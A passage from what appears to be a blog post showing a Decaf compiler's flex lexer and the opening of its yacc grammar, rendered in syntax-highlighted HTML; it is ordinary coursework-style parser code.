class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs livescript">%&#123;<br><span class="hljs-comment">#include &quot;default-defs.h&quot;</span><br><span class="hljs-comment">#include &quot;decafast.tab.h&quot;</span><br><span class="hljs-comment">#include &lt;cstring&gt;</span><br><span class="hljs-comment">#include &lt;string&gt;</span><br><span class="hljs-comment">#include &lt;sstream&gt;</span><br><span class="hljs-comment">#include &lt;iostream&gt;</span><br>using namespace std;<br>extern int yylineno;<br>extern int yytokenpos;<br>string &amp; covert_newline(string &amp; s)&#123;<br>    string tmp = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span>(size_t i = <span class="hljs-number">0</span>; i &lt; s.size(); i++)<br>      <span class="hljs-keyword">if</span>(s[i] == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>        tmp += <span class="hljs-string">&quot;\\n&quot;</span>;<br>      <span class="hljs-keyword">else</span><br>        tmp += s[i];<br>    s = tmp;<br>    <span class="hljs-keyword">return</span> s;<br>&#125;<br><br>%&#125;<br>%option yylineno<br>%%<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    Pattern definitions for all tokens1</span><br><span class="hljs-comment">  */</span><br><span class="hljs-string">\&#123;</span>                         &#123; <span class="hljs-keyword">return</span> T_LCB; &#125;<br><span class="hljs-string">\&#125;</span>                         &#123; <span class="hljs-keyword">return</span> T_RCB; &#125;<br>bool                       &#123; yylval.sval = <span class="hljs-keyword">new</span> string(<span class="hljs-string">&quot;BoolType&quot;</span>); <span class="hljs-keyword">return</span> T_BOOLTYPE; &#125;<br>package                    &#123; <span class="hljs-keyword">return</span> T_PACKAGE; &#125;<br>func                       &#123; <span class="hljs-keyword">return</span> T_FUNC; &#125;<br><span class="hljs-keyword">return</span>                     &#123; <span class="hljs-keyword">return</span> T_RETURN; &#125;<br><span class="hljs-keyword">while</span>                      &#123; <span class="hljs-keyword">return</span> T_WHILE; &#125;<br><span class="hljs-literal">void</span>                       &#123; yylval.sval = <span class="hljs-keyword">new</span> string(<span class="hljs-string">&quot;VoidType&quot;</span>);<span class="hljs-keyword">return</span> T_VOID; &#125;<br><span class="hljs-keyword">var</span>                        &#123; <span class="hljs-keyword">return</span> T_VAR; &#125;<br>string                     &#123; yylval.sval = <span class="hljs-keyword">new</span> string(<span class="hljs-string">&quot;StringType&quot;</span>);<span class="hljs-keyword">return</span> T_STRINGTYPE; &#125;<br><span class="hljs-literal">true</span>                       &#123; <span class="hljs-keyword">return</span> T_TRUE; &#125;<br><span class="hljs-literal">null</span>                       &#123; <span class="hljs-keyword">return</span> T_NULL; &#125;<br>int                        &#123; yylval.sval = <span class="hljs-keyword">new</span> string(<span class="hljs-string">&quot;IntType&quot;</span>);<span class="hljs-keyword">return</span> T_INTTYPE; &#125;<br><span class="hljs-keyword">if</span>                         &#123; <span class="hljs-keyword">return</span> T_IF; &#125;<br>extern                     &#123; <span class="hljs-keyword">return</span> T_EXTERN; &#125;<br><span class="hljs-keyword">for</span>                        &#123; <span class="hljs-keyword">return</span> T_FOR; &#125;<br><span class="hljs-keyword">break</span>                      &#123; <span class="hljs-keyword">return</span> T_BREAK; &#125;<br><span class="hljs-keyword">continue</span>                   &#123; <span class="hljs-keyword">return</span> T_CONTINUE; &#125;<br><span class="hljs-keyword">else</span>                       &#123; <span class="hljs-keyword">return</span> T_ELSE; &#125;<br><span class="hljs-literal">false</span>                      &#123; <span class="hljs-keyword">return</span> T_FALSE; &#125;<br>[a-zA-Z<span class="hljs-string">\_][a-zA-Z\_0-9]*</span>   &#123; yylval.sval = <span class="hljs-keyword">new</span> string(yytext); <span class="hljs-keyword">return</span> T_ID; &#125;<br>,                          &#123; <span class="hljs-keyword">return</span> T_COMMA; &#125;<br>==                         &#123; <span class="hljs-keyword">return</span> T_EQ;  &#125;<br>&gt;=                         &#123; <span class="hljs-keyword">return</span> T_GEQ; &#125;<br>&gt;                          &#123; <span class="hljs-keyword">return</span> T_GT;  &#125;<br><span class="hljs-string">\&lt;\&lt;</span>                       &#123; <span class="hljs-keyword">return</span> T_LEFTSHIFT;  &#125;<br>&gt;&gt;                         &#123; <span class="hljs-keyword">return</span> T_RIGHTSHIFT; &#125;<br><span class="hljs-string">\&lt;=</span>                        &#123; <span class="hljs-keyword">return</span> T_LEQ; &#125;<br><span class="hljs-string">\[</span>                         &#123; <span class="hljs-keyword">return</span> T_LSB; &#125;<br><span class="hljs-string">\]</span>                         &#123; <span class="hljs-keyword">return</span> T_RSB; &#125;<br><span class="hljs-string">\&lt;</span>                         &#123; <span class="hljs-keyword">return</span> T_LT; &#125;<br><span class="hljs-string">\-</span>                         &#123; <span class="hljs-keyword">return</span> T_MINUS; &#125;<br><span class="hljs-string">\+</span>                         &#123; <span class="hljs-keyword">return</span> T_PLUS; &#125;<br><span class="hljs-string">\%</span>                         &#123; <span class="hljs-keyword">return</span> T_MOD; &#125;<br><span class="hljs-string">\*</span>                         &#123; <span class="hljs-keyword">return</span> T_MULT; &#125;<br>!=                         &#123; <span class="hljs-keyword">return</span> T_NEQ; &#125;<br>!                          &#123; <span class="hljs-keyword">return</span> T_NOT; &#125;<br><span class="hljs-string">\|\|</span>                       &#123; <span class="hljs-keyword">return</span> T_OR; &#125;<br>;                          &#123; <span class="hljs-keyword">return</span> T_SEMICOLON; &#125;<br><span class="hljs-string">\&quot;([^\n&quot;\\]|\\(a|b|t|n|v|f|r|\\|\&#x27;|\&quot;))*\&quot;</span> &#123;  yylval.sval = <span class="hljs-keyword">new</span> string(yytext); <span class="hljs-keyword">return</span> T_STRINGCONSTANT; &#125;<br><br>([<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]+(<span class="hljs-string">\.[0-9]+)?)|(0[xX][0-9A-Fa-f]+)</span>          &#123; yylval.sval = <span class="hljs-keyword">new</span> string(yytext); <span class="hljs-keyword">return</span> T_INTCONSTANT; &#125;<br><span class="hljs-string">\&#x27;([^\n&#x27;\\]|\\(a|b|t|n|v|f|r|\\|\&#x27;|\&quot;))\&#x27;</span>        &#123; yylval.sval = <span class="hljs-keyword">new</span> string(yytext); <span class="hljs-keyword">return</span> T_CHARCONSTANT; &#125;<br><span class="hljs-string">&quot;//&quot;</span>.*<span class="hljs-string">&quot;\n&quot;</span>                 &#123;  &#125;<br><span class="hljs-string">\(</span>                         &#123; <span class="hljs-keyword">return</span> T_LPAREN; &#125;<br><span class="hljs-string">\)</span>                         &#123; <span class="hljs-keyword">return</span> T_RPAREN; &#125;<br><br>&amp;&amp;                         &#123; <span class="hljs-keyword">return</span> T_AND; &#125;<br>=                          &#123; <span class="hljs-keyword">return</span> T_ASSIGN; &#125;<br><span class="hljs-string">\/</span>                         &#123; <span class="hljs-keyword">return</span> T_DIV; &#125;<br><span class="hljs-string">&quot;.&quot;</span>                        &#123; <span class="hljs-keyword">return</span> T_DOT; &#125; <br>[<span class="hljs-string">\t\r\n\a\v\b</span> ]+           &#123;  &#125; <span class="hljs-comment">/* ignore whitespace */</span><br>.                          &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Error: unexpected character in input&quot;</span> &lt;&lt; endl; <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>; &#125;<br>%%<br><br>int yyerror(<span class="hljs-keyword">const</span> char *s) &#123;<br>  cerr &lt;&lt; yylineno &lt;&lt; <span class="hljs-string">&quot;:&quot;</span> &lt;&lt; s &lt;&lt; endl;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="yacc-代码-decafast-y"><a href="#yacc-代码-decafast-y" class="headerlink" title="yacc 代码: decafast.y"></a>yacc 代码: decafast.y</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br></pre></td><td class="code"><pre><code class="hljs powershell">%&#123;<br><span class="hljs-comment">#include &lt;iostream&gt;</span><br><span class="hljs-comment">#include &lt;ostream&gt;</span><br><span class="hljs-comment">#include &lt;string&gt;</span><br><span class="hljs-comment">#include &lt;cstdlib&gt;</span><br><span class="hljs-comment">#include &lt;vector&gt;</span><br><span class="hljs-comment">#include &quot;default-defs.h&quot;</span><br><br>int yylex(void);<br>int yyerror(char *); <br><br>// print AST<br>bool printAST = true;<br><span class="hljs-comment">#include &quot;decafast.cc&quot;</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br>string proceesCharLit(string charlit) &#123;<br>    // a|b|t|n|v|f|<span class="hljs-built_in">r</span><br>    <span class="hljs-keyword">if</span> (charlit[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;\\&#x27;</span>)&#123;<br>        <span class="hljs-keyword">switch</span> (charlit[<span class="hljs-number">2</span>])&#123;<br>            case <span class="hljs-string">&#x27;n&#x27;</span>:<br>                <span class="hljs-keyword">return</span> to_string(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>            case <span class="hljs-string">&#x27;a&#x27;</span>:<br>                <span class="hljs-keyword">return</span> to_string(<span class="hljs-string">&#x27;\a&#x27;</span>);<br>            case <span class="hljs-string">&#x27;b&#x27;</span>:<br>                <span class="hljs-keyword">return</span> to_string(<span class="hljs-string">&#x27;\b&#x27;</span>);<br>            case <span class="hljs-string">&#x27;t&#x27;</span>:<br>                <span class="hljs-keyword">return</span> to_string(<span class="hljs-string">&#x27;\t&#x27;</span>);<br>            case <span class="hljs-string">&#x27;v&#x27;</span>:<br>                <span class="hljs-keyword">return</span> to_string(<span class="hljs-string">&#x27;\v&#x27;</span>);<br>            case <span class="hljs-string">&#x27;f&#x27;</span>:<br>                <span class="hljs-keyword">return</span> to_string(<span class="hljs-string">&#x27;\f&#x27;</span>);<br>            case <span class="hljs-string">&#x27;r&#x27;</span>:<br>                <span class="hljs-keyword">return</span> to_string(<span class="hljs-string">&#x27;\r&#x27;</span>);<br>            case <span class="hljs-string">&#x27;\\&#x27;</span>:<br>                <span class="hljs-keyword">return</span> to_string(<span class="hljs-string">&#x27;\\&#x27;</span>);<br>            case <span class="hljs-string">&#x27;\&#x27;</span><span class="hljs-string">&#x27;:</span><br><span class="hljs-string">                return to_string(&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span>);<br>            case <span class="hljs-string">&#x27;\&quot;&#x27;</span>:<br>                <span class="hljs-keyword">return</span> to_string(<span class="hljs-string">&#x27;\&quot;&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> to_string(charlit[<span class="hljs-number">1</span>]);<br>&#125;<br>%&#125;<br><br>%union&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">decafAST</span> *<span class="hljs-title">ast</span>;</span><br><span class="hljs-class">    <span class="hljs-title">std</span>::<span class="hljs-title">string</span> *<span class="hljs-title">sval</span>;</span><br><span class="hljs-class">    <span class="hljs-title">std</span>::<span class="hljs-title">vector</span>&lt;<span class="hljs-title">std</span>::<span class="hljs-title">string</span>&gt; *<span class="hljs-title">svals</span>;</span><br><span class="hljs-class"> &#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class">%<span class="hljs-title">token</span> <span class="hljs-title">T_PACKAGE</span></span><br><span class="hljs-class">%<span class="hljs-title">token</span> <span class="hljs-title">T_LCB</span></span><br><span class="hljs-class">%<span class="hljs-title">token</span> <span class="hljs-title">T_RCB</span></span><br><span class="hljs-class">%<span class="hljs-title">token</span> &lt;<span class="hljs-title">sval</span>&gt; <span class="hljs-title">T_ID</span> <span class="hljs-title">T_STRINGTYPE</span> <span class="hljs-title">T_INTTYPE</span> <span class="hljs-title">T_BOOLTYPE</span>  <span class="hljs-title">T_VOID</span> <span class="hljs-title">T_INTCONSTANT</span> <span class="hljs-title">T_STRINGCONSTANT</span> <span class="hljs-title">T_CHARCONSTANT</span></span><br><span class="hljs-class">%<span class="hljs-title">token</span> <span class="hljs-title">T_N_TOKEN</span> <span class="hljs-title">T_FUNC</span> <span class="hljs-title">T_INT</span> <span class="hljs-title">T_LPAREN</span> <span class="hljs-title">T_RPAREN</span> <span class="hljs-title">T_WHITESPACE</span> <span class="hljs-title">T_WHITESPACE_N</span> <span class="hljs-title">T_AND</span> <span class="hljs-title">T_ASSIGN</span>  <span class="hljs-title">T_BREAK</span> <span class="hljs-title">T_COMMA</span> <span class="hljs-title">T_COMMENT</span>  <span class="hljs-title">T_CONTINUE</span>  <span class="hljs-title">T_DIV</span>  <span class="hljs-title">T_DOT</span>  <span class="hljs-title">T_ELSE</span>  <span class="hljs-title">T_EQ</span>  <span class="hljs-title">T_EXTERN</span>  <span class="hljs-title">T_FALSE</span>  <span class="hljs-title">T_FOR</span>  <span class="hljs-title">T_GEQ</span>  <span class="hljs-title">T_GT</span>  <span class="hljs-title">T_IF</span> <span class="hljs-title">T_LEFTSHIFT</span>  <span class="hljs-title">T_LEQ</span>  <span class="hljs-title">T_LSB</span>  <span class="hljs-title">T_LT</span>  <span class="hljs-title">T_MINUS</span>  <span class="hljs-title">T_MOD</span>  <span class="hljs-title">T_MULT</span> <span class="hljs-title">T_NEQ</span>  <span class="hljs-title">T_NOT</span>  <span class="hljs-title">T_NULL</span>  <span class="hljs-title">T_OR</span>  <span class="hljs-title">T_PLUS</span>  <span class="hljs-title">T_RIGHTSHIFT</span>  <span class="hljs-title">T_RSB</span>  <span class="hljs-title">T_SEMICOLON</span> <span class="hljs-title">T_TRUE</span>  <span class="hljs-title">T_VAR</span>  <span class="hljs-title">T_WHILE</span>  <span class="hljs-title">T_RETURN</span></span><br><span class="hljs-class">%<span class="hljs-title">type</span> &lt;<span class="hljs-title">ast</span>&gt; <span class="hljs-title">return_type</span> <span class="hljs-title">extern_list</span> <span class="hljs-title">decafpackage</span> <span class="hljs-title">extern_stmt</span> <span class="hljs-title">extern_var_list</span> <span class="hljs-title">ExternType</span> <span class="hljs-title">program</span> <span class="hljs-title">field_list</span> <span class="hljs-title">method_list</span> <span class="hljs-title">MethodDecl</span> <span class="hljs-title">FieldDecl</span> <span class="hljs-title">normal_type</span> <span class="hljs-title">constant_expr</span> <span class="hljs-title">T_TRUE</span> <span class="hljs-title">T_FALSE</span> <span class="hljs-title">typed_var_defs</span> <span class="hljs-title">Block</span> <span class="hljs-title">Statement</span> <span class="hljs-title">Statements</span> <span class="hljs-title">MethodArg</span> <span class="hljs-title">MethodArgList</span> <span class="hljs-title">ForAssignList</span>  <span class="hljs-title">ElseBlock</span> <span class="hljs-title">Expr</span> <span class="hljs-title">Assign</span> <span class="hljs-title">MethodCall</span> <span class="hljs-title">VarDecl</span> <span class="hljs-title">MethodBlock</span> <span class="hljs-title">VarDecls</span></span><br><span class="hljs-class">%<span class="hljs-title">type</span> &lt;<span class="hljs-title">svals</span>&gt; <span class="hljs-title">comma_id_list</span> </span><br><span class="hljs-class"></span><br><span class="hljs-class">%<span class="hljs-title">nonassoc</span> <span class="hljs-title">T_ID</span></span><br><span class="hljs-class">%<span class="hljs-title">nonassoc</span> <span class="hljs-title">HIGHIER_T_ID</span></span><br><span class="hljs-class"></span><br><span class="hljs-class">%<span class="hljs-title">left</span> <span class="hljs-title">T_OR</span></span><br><span class="hljs-class">%<span class="hljs-title">left</span> <span class="hljs-title">T_AND</span></span><br><span class="hljs-class">%<span class="hljs-title">left</span> <span class="hljs-title">T_EQ</span> <span class="hljs-title">T_NEQ</span> <span class="hljs-title">T_LT</span> <span class="hljs-title">T_LEQ</span> <span class="hljs-title">T_GT</span> <span class="hljs-title">T_GEQ</span></span><br><span class="hljs-class">%<span class="hljs-title">left</span> <span class="hljs-title">T_PLUS</span> <span class="hljs-title">T_MINUS</span></span><br><span class="hljs-class">%<span class="hljs-title">left</span> <span class="hljs-title">T_MULT</span> <span class="hljs-title">T_DIV</span> <span class="hljs-title">T_MOD</span> <span class="hljs-title">T_RIGHTSHIFT</span> <span class="hljs-title">T_LEFTSHIFT</span></span><br><span class="hljs-class">%<span class="hljs-title">left</span> <span class="hljs-title">UMINUS</span></span><br><span class="hljs-class">%<span class="hljs-title">left</span> <span class="hljs-title">UNOT</span></span><br><span class="hljs-class">%%</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">start</span>: <span class="hljs-title">program</span></span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">program</span>: <span class="hljs-title">extern_list</span> <span class="hljs-title">decafpackage</span></span><br><span class="hljs-class"></span>    &#123; <br>        ProgramAST *prog = new ProgramAST((decafStmtList *)<span class="hljs-variable">$1</span>, (PackageAST *)<span class="hljs-variable">$2</span>); <br><span class="hljs-keyword">if</span> (printAST) &#123;<br>cout &lt;&lt; getString(prog) &lt;&lt; endl;<br>&#125;<br>        delete prog;<br>    &#125;<br><br>extern_list: /* extern_list can be empty */<br>    &#123; decafStmtList *slist = new decafStmtList(); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist; &#125;<br>    | extern_list extern_stmt &#123; decafStmtList *slist = (decafStmtList *) <span class="hljs-variable">$1</span>; slist-&gt;push_back(<span class="hljs-variable">$2</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist; &#125;<br><br>extern_stmt: T_EXTERN T_FUNC T_ID T_LPAREN extern_var_list T_RPAREN return_type T_SEMICOLON<br>    &#123;<br>        VarDefAST * ast_var_def = new VarDefAST((decafStmtList *)<span class="hljs-variable">$5</span>);<br>        ExternFunctionAST * ast_extern_<span class="hljs-function"><span class="hljs-keyword">function</span> = <span class="hljs-title">new</span> <span class="hljs-title">ExternFunctionAST</span><span class="hljs-params">(*<span class="hljs-variable">$3</span>, (TypeAST * )</span>$<span class="hljs-title">7</span>, <span class="hljs-title">ast_var_def</span>);</span><br>        delete <span class="hljs-variable">$3</span>;<br>        <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = ast_extern_function;<br>    &#125;<br><br><br>extern_var_list: <br>    &#123; decafStmtList *slist = new decafStmtList(); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist;&#125;<br>    | extern_var_list T_COMMA ExternType &#123; decafStmtList * slist = (decafStmtList *)<span class="hljs-variable">$1</span>; slist-&gt;push_back(<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist; &#125;<br>    | ExternType   &#123; decafStmtList * slist = new decafStmtList(); slist-&gt;push_back(<span class="hljs-variable">$1</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist;  &#125;<br><br>ExternType: T_STRINGTYPE &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = new TypeAST(<span class="hljs-variable">$1</span>); &#125; <br>        | T_INTTYPE &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = new TypeAST(<span class="hljs-variable">$1</span>); &#125;<br>        | T_BOOLTYPE &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = new TypeAST(<span class="hljs-variable">$1</span>); &#125;<br><br>return_type: T_VOID &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = new TypeAST(<span class="hljs-variable">$1</span>);&#125;<br>    | T_BOOLTYPE &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = new TypeAST(<span class="hljs-variable">$1</span>); &#125;<br>    | T_INTTYPE &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = new TypeAST(<span class="hljs-variable">$1</span>); &#125;<br>    | T_STRINGTYPE &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = new TypeAST(<span class="hljs-variable">$1</span>); &#125;<br><br>normal_type: <br>    T_BOOLTYPE &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = new TypeAST(<span class="hljs-variable">$1</span>); &#125;<br>    | T_INTTYPE &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = new TypeAST(<span class="hljs-variable">$1</span>); &#125;<br>    | T_STRINGTYPE &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = new TypeAST(<span class="hljs-variable">$1</span>); &#125;<br><br>decafpackage: T_PACKAGE T_ID T_LCB field_list method_list T_RCB<br>    &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = new PackageAST(*<span class="hljs-variable">$2</span>, (decafStmtList *)<span class="hljs-variable">$4</span>, (decafStmtList *)<span class="hljs-variable">$5</span>); delete <span class="hljs-variable">$2</span>; &#125;<br><br><br>field_list:<br>    &#123; decafStmtList * slist = new decafStmtList(); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist; &#125;<br>    | field_list FieldDecl &#123;<br>        decafStmtList * slist = (decafStmtList *)<span class="hljs-variable">$1</span>;<br>        decafStmtList * slist2 = (decafStmtList *)<span class="hljs-variable">$2</span>;<br>        slist2-&gt;move_to(slist);<br>        delete slist2;<br>      //  std::cout &lt;&lt; getString(slist) &lt;&lt; endl;<br>        <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist;<br>    &#125;<br><br>constant_expr: T_INTCONSTANT &#123;NumberExpr * ne = new NumberExpr(*<span class="hljs-variable">$1</span>); delete <span class="hljs-variable">$1</span>; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = ne; &#125;<br>    | T_TRUE &#123; BoolExpr * be = new BoolExpr(true); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = be;&#125;<br>    | T_FALSE &#123; BoolExpr * be = new BoolExpr(false); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = be;&#125;<br>    | T_CHARCONSTANT &#123;NumberExpr * ne = new NumberExpr(proceesCharLit(*<span class="hljs-variable">$1</span>)); delete <span class="hljs-variable">$1</span>; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = ne; &#125;<br>    | T_STRINGCONSTANT &#123; StringConstantAST * sast = new StringConstantAST(*<span class="hljs-variable">$1</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = sast; delete <span class="hljs-variable">$1</span>; &#125;<br><br>FieldDecl:<br>    T_VAR  comma_id_list normal_type T_SEMICOLON <br>    &#123;<br>        decafStmtList * slist = new decafStmtList();<br>        <span class="hljs-keyword">for</span>(std::vector&lt;std::string&gt;::iterator i = <span class="hljs-variable">$2</span>-&gt;<span class="hljs-keyword">begin</span>(); i != <span class="hljs-variable">$2</span>-&gt;<span 